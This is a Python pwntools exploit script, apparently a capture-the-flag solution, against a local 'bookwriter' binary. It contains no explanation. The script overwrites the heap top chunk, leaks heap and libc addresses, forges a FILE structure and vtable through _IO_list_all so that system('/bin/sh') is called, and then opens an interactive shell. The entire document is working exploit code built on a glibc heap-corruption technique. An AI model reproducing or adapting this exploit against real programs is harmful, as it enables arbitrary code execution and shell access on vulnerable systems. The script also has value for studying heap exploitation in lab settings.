from pwn import *
def add(opt, size, content):
	if(opt==0):
		s.recvuntil("choice :")
		s.send("1")
		s.recvuntil("page :")
		s.send(str(size))
		s.recvuntil("Content :")
		s.send(content)
	elif(opt==1):
		s.send("1")
		s.recvuntil("page :")
		s.send(str(size))
		s.recvuntil("Content :")
		s.send(content)

def view(index):
	s.recvuntil("choice :")
	s.send("2")
	s.recvuntil("page :")
	s.send(str(index))
	s.recvuntil("Content :")
	return(u64(s.recv(1024)[9:15]+"\x00\x00"))

def edit(opt, index, content):
	if(opt==0):
		s.recvuntil("choice :")
		s.send("3")
		s.recvuntil("page :")
		s.send(str(index))
		s.recvuntil("Content:")
		s.send(content)
	elif(opt==1):
		s.send("3")
		s.recvuntil("page :")
		s.send(str(index))
		s.recvuntil("Content:")
		s.send(content)

def info(author=""):
	if(author!=""):
		s.recvuntil("choice :")
		s.send("4")
		s.recvuntil(") ")
		s.send("1\n")
		s.recvuntil("Author :")
		s.send(author)
	else:
		s.recvuntil("choice :")
		s.send("4")
		a=s.recvuntil(") ")[0x49:0x50]
		a=a.split("\nP")[0]
		a=a+"\x00"*(8-len(a))
		a=u64(a)
		s.send("0\n")
		return(a)

s=process("./bookwriter")
s.recvuntil("Author :")
s.send("a"*0x40)
add(0,0,"\x00")
add(0,0x18,"b"*0x18)
edit(0,1,"c"*0x18)
edit(0,1,"d"*0x18+"\xc1\x0f\x00")
add(0,0x1000,"e"*5)
heap_leak=info()
jump_table=heap_leak-0x831010+0x8540a0
print(hex(heap_leak))
print(hex(jump_table))
add(0,0xf00,"f"*8)
libc_leak=view(3)
_IO_list_all=libc_leak-0x7f085d677188+0x7f085d677520
system=libc_leak-0x7f085d677188+0x7f085d2f7390
main_arena=libc_leak-0x7f085d677188+0x7f085d676b20
print(hex(libc_leak))
print(hex(_IO_list_all))
print(hex(system))
print(hex(main_arena))
add(1,0x18,"g"*5)
for i in range(4,8):
	print(i)
	add(0, 0x18, "g"*5)
edit(0,0,"\x00"*0x23038+"\xc1\x0f\x00")

add(0,0x1000,"h"*5)
base=0x831010
top=0x854040
payload="\x00"*(top-base)+"/bin/sh\x00"+p64(0x61)+p64(main_arena+88)+p64(_IO_list_all-0x10)+p64(2)+p64(3)
payload+="\x00"*(0x78-0x30)+p64(system)
payload+="\x00"*(0xc0-0x80)+p64(0)
payload+="\x00"*(0xd8-0xc8)+p64(jump_table)
edit(0,0,payload)
s.recvuntil("choice :")
s.send("1")
s.recvuntil("page :")
s.send(str(10))
#add(1, 30,"cdef")
s.interactive()
s.close()